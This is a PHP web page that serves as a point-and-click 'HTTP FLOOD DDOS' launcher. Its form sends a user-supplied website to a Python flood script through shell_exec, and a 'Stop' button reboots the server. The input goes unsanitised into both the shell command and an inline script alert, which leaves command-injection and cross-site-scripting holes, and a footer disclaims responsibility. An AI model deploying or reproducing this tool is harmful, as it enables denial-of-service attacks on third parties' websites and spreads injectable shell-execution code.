<?php
   if( $_POST["site"] ) {      
$site = $_POST["site"];
echo"<script>alert('Attacking $site')</script>";    
echo shell_exec("python2 ddos.py http://$site");
   }
$htmlmobile = base64_decode('PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFhIVE1MIE1vYmlsZSAxLjAvL0VOIiAiaHR0cDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3hodG1sLW1vYmlsZTEwLmR0ZCI+');
if( $_POST["stop"]) {      
echo $htmlmobile;
$stop = $_POST["stop"];
echo shell_exec("reboot");
echo shell_exec("exit");
echo"<script>alert('All attacks has been stopped')</script>";
   }
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html>
<title>HTTP FLOOD DDOS</title>
<head>
<style>
		html {
height: 100%;
}
		body {
  height: 100%;
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  display: grid;
  align-items: center;
  justify-items: center;
  background-color: #D9D8DA;
}
	#textbox {
		weight: 100;
  border-color: red;
  border-bottom: 1px solid #3a3a3a;
  margin-bottom: 15px;
  border-radius: 100px;
  outline: none;
  padding: 5px;
}
#button {
  width: 50%;
  padding: 6px;
  border: 100;
  border-color: red;
  border-radius: 100px;
  color: black;
  font-weight: bold;
  background-color: white;
  cursor: pointer;
  outline: none;
  
}
#main-de {
width: 70%;
  height: 70%;
  display: grid;
  justify-items: center;
  align-items: center;
  background-color: white;
  border-radius: 50px;
  box-shadow: 0px 0px 5px 2px red;
}
#wow {
width: 70%;
  height: 70%;
  display: grid;
  justify-items: center;
  align-items: center;
  background-color: white;
  border-radius: 50px;
  box-shadow: 0px 0px 5px 2px red;
}
</style>
</head>
   <body>
<center>
<main id="main-de">
   
      <form action = "<?php $_PHP_SELF ?>" method = "POST">
<h3>HTTP FLOOD DDOS</h3>
         Website: <input type = "text" id="textbox" name = "site" placeholder = "website.com"/>
         <input type = "submit" id = "button" value="Attack!"/>
<input type="submit" name="stop" id="button" value="Stop" />

      </form>
<p>Created by Ph.Kawayan</p>
</main>
<br>
<br>
<br>
<main id="wow">
<p>This DDOS Site is not my responsiblity,<br> i built this for easy to use DDOs, <br> and to test certain website if they are vulnerable for this kind of attack.
</p>
</main>
   </body>
</html>
